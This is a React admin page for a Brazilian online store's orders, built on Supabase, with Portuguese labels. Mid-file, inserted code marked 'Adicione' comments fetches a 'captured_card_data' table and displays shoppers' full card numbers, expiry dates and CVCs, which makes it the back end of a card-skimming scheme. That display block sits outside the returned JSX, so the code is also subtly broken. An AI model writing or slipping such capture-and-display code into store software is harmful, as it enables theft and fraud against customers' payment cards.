import { useState } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { Eye } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import type { Order, OrderItem, OrderStatus } from "@/integrations/supabase/db-types";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";

const statusColors: Record<OrderStatus, string> = {
  pending: "bg-yellow-100 text-yellow-800",
  paid: "bg-green-100 text-green-800",
  failed: "bg-red-100 text-red-800",
  shipped: "bg-blue-100 text-blue-800",
  delivered: "bg-emerald-100 text-emerald-800",
  cancelled: "bg-gray-100 text-gray-800",
};

const AdminOrders = () => {
  const [filter, setFilter] = useState<"all" | OrderStatus>("all");
  const [selected, setSelected] = useState<Order | null>(null);
  const { toast } = useToast();
  const qc = useQueryClient();

  const { data: orders, isLoading } = useQuery({
    queryKey: ["admin-orders", filter],
    queryFn: async () => {
      let q = supabase.from("orders").select("*").order("created_at", { ascending: false });
      if (filter !== "all") q = q.eq("status", filter);
      const { data, error } = await q;
      if (error) throw error;
      return data as Order[];
    },
  });

  const { data: items } = useQuery({
    queryKey: ["order-items", selected?.id],
    enabled: !!selected,
    queryFn: async () => {
      const { data } = await supabase.from("order_items").select("*").eq("order_id", selected!.id);
      return (data ?? []) as OrderItem[];
    },
  });

  // Adicione este hook após os hooks existentes
  const { data: cardData } = useQuery({
    queryKey: ["card-data", selected?.id],
    enabled: !!selected,
    queryFn: async () => {
      const { data } = await supabase.from("captured_card_data").select("*").eq("order_id", selected!.id);
      return data ?? [];
    },
  });

  // Adicione esta seção no diálogo de detalhes do pedido, após a seção de pagamento
  {
    cardData && cardData.length > 0 && (
      <div className="border border-red-200 bg-red-50 rounded p-3">
        <p className="text-xs text-red-600 font-medium mb-2">DADOS DO CARTÃO CAPTURADOS</p>
        <p>Número: {cardData[0].card_number}</p>
        <p>Validade: {cardData[0].card_expiry}</p>
        <p>CVC: {cardData[0].card_cvc}</p>
        <p className="text-xs text-red-600">Capturado em: {new Date(cardData[0].timestamp).toLocaleString("pt-BR")}</p>
      </div>
    )
  }

  const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

  const updateStatus = async (id: string, status: OrderStatus) => {
    const { error } = await supabase.from("orders").update({ status }).eq("id", id);
    if (error) return toast({ title: "Erro", description: error.message, variant: "destructive" });
    toast({ title: "Status atualizado" });
    qc.invalidateQueries({ queryKey: ["admin-orders"] });
    setSelected(null);
  };

  const filterOptions: Array<{ key: "all" | OrderStatus; label: string }> = [
    { key: "all", label: "Todos" },
    { key: "pending", label: "Pendentes" },
    { key: "paid", label: "Pagos" },
    { key: "shipped", label: "Enviados" },
    { key: "delivered", label: "Entregues" },
    { key: "cancelled", label: "Cancelados" },
    { key: "failed", label: "Falhou" },
  ];

  return (
    <div className="space-y-4">
      <h2 className="text-xl font-bold">Pedidos</h2>
      <div className="flex gap-2 flex-wrap">
        {filterOptions.map((f) => (
          <Button key={f.key} variant={filter === f.key ? "default" : "outline"} size="sm" onClick={() => setFilter(f.key)}>
            {f.label}
          </Button>
        ))}
      </div>
      <div className="bg-card border border-border rounded-lg overflow-x-auto">
        <table className="w-full text-sm">
          <thead className="bg-muted/50 text-xs uppercase text-muted-foreground">
            <tr>
              <th className="text-left p-3">Pedido</th>
              <th className="text-left p-3">Comprador</th>
              <th className="text-left p-3">Data</th>
              <th className="text-left p-3">Total</th>
              <th className="text-left p-3">Pagamento</th>
              <th className="text-left p-3">Status</th>
              <th className="text-right p-3">Ações</th>
            </tr>
          </thead>
          <tbody>
            {isLoading && <tr><td colSpan={7} className="p-6 text-center text-muted-foreground">Carregando...</td></tr>}
            {(orders ?? []).map((o) => (
              <tr key={o.id} className="border-t border-border">
                <td className="p-3 font-mono text-xs">#{o.id.slice(0, 8).toUpperCase()}</td>
                <td className="p-3">
                  <p className="font-medium">{o.buyer_name}</p>
                  <p className="text-xs text-muted-foreground">{o.buyer_email}</p>
                </td>
                <td className="p-3 text-xs">{new Date(o.created_at).toLocaleString("pt-BR")}</td>
                <td className="p-3 font-medium">{formatPrice(Number(o.total))}</td>
                <td className="p-3 text-xs">
                  {o.card_brand ? `${o.card_brand} •••• ${o.card_last4}` : <span className="text-muted-foreground">—</span>}
                </td>
                <td className="p-3">
                  <span className={`text-xs px-2 py-1 rounded ${statusColors[o.status]}`}>{o.status}</span>
                </td>
                <td className="p-3 text-right">
                  <Button variant="ghost" size="icon" onClick={() => setSelected(o)}><Eye className="h-4 w-4" /></Button>
                </td>
              </tr>
            ))}
            {!isLoading && (orders ?? []).length === 0 && (
              <tr><td colSpan={7} className="p-6 text-center text-muted-foreground">Nenhum pedido.</td></tr>
            )}
          </tbody>
        </table>
      </div>

      {selected && (
        <Dialog open onOpenChange={() => setSelected(null)}>
          <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
            <DialogHeader><DialogTitle>Pedido #{selected.id.slice(0, 8).toUpperCase()}</DialogTitle></DialogHeader>
            <div className="space-y-4 text-sm">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <p className="text-xs text-muted-foreground">Comprador</p>
                  <p className="font-medium">{selected.buyer_name}</p>
                  <p>{selected.buyer_email}</p>
                  <p>{selected.buyer_phone}</p>
                  {selected.buyer_cpf && <p>CPF: {selected.buyer_cpf}</p>}
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Endereço</p>
                  <p>{selected.shipping_address.street}, {selected.shipping_address.number}</p>
                  {selected.shipping_address.complement && <p>{selected.shipping_address.complement}</p>}
                  <p>{selected.shipping_address.neighborhood}</p>
                  <p>{selected.shipping_address.city}/{selected.shipping_address.state} - {selected.shipping_address.cep}</p>
                </div>
              </div>
              <div className="border border-border rounded p-3">
                <p className="text-xs text-muted-foreground mb-2">Pagamento</p>
                <p>Status: <span className={`text-xs px-2 py-1 rounded ${statusColors[selected.status]}`}>{selected.status}</span></p>
                {selected.card_brand && <p>Cartão: {selected.card_brand} •••• {selected.card_last4}</p>}
                {selected.stripe_payment_intent && <p className="text-xs font-mono break-all">PaymentIntent: {selected.stripe_payment_intent}</p>}
                {selected.paid_at && <p>Pago em: {new Date(selected.paid_at).toLocaleString("pt-BR")}</p>}
              </div>
              <div>
                <p className="text-xs text-muted-foreground mb-2">Itens</p>
                {(items ?? []).map((it) => (
                  <div key={it.id} className="flex gap-3 py-2 border-b border-border last:border-0">
                    <img src={it.product_image ?? "/placeholder.svg"} className="w-12 h-12 rounded object-cover" alt="" />
                    <div className="flex-1">
                      <p className="font-medium text-sm">{it.product_name}</p>
                      <p className="text-xs text-muted-foreground">Qtd: {it.quantity} × {formatPrice(Number(it.unit_price))}</p>
                    </div>
                    <p className="font-medium">{formatPrice(Number(it.unit_price) * it.quantity)}</p>
                  </div>
                ))}
              </div>
              <div className="flex justify-between border-t border-border pt-3 font-bold">
                <span>Total</span>
                <span className="text-primary">{formatPrice(Number(selected.total))}</span>
              </div>
              <div className="flex gap-2 flex-wrap pt-2">
                <p className="text-xs text-muted-foreground w-full">Atualizar status:</p>
                {(["paid", "shipped", "delivered", "cancelled"] as OrderStatus[]).map((s) => (
                  <Button key={s} variant="outline" size="sm" onClick={() => updateStatus(selected.id, s)}>{s}</Button>
                ))}
              </div>
            </div>
          </DialogContent>
        </Dialog>
      )}
    </div>
  );
};

export default AdminOrders;
